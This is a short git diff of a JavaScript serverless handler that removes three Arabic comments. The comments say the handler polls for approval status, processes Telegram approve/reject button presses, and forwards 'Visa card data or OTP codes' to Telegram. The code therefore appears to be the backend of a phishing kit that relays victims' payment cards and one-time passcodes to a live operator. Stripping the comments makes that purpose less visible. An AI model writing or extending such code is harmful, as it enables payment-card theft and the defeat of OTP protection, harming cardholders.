@@ -12,7 +12,6 @@ export default async function handler(req, res) {
   const method = req.method;
   const body = req.body || {};
 
-  // 1. فحص الحالة (هل تمت الموافقة؟) عند طلبها من المتصفح
   if (method === 'GET') {
     const { user_id } = req.query;
     if (!user_id) return res.status(200).json({ status: 'pending' });
@@ -20,7 +19,6 @@ export default async function handler(req, res) {
     return res.status(200).json({ status });
   }
 
-  // 2. معالجة الضغط على أزرار تليجرام (موافقة / رفض)
   if (body.callback_query) {
     const callback = body.callback_query;
     const callbackData = callback.data;
@@ -55,7 +53,6 @@ export default async function handler(req, res) {
     return res.status(200).json({ ok: true });
   }
 
-  // 3. إرسال البيانات (سواء كانت بيانات فيزا أو كود OTP) إلى تليجرام
   let text = '';
   let actionType = 'pay';
 
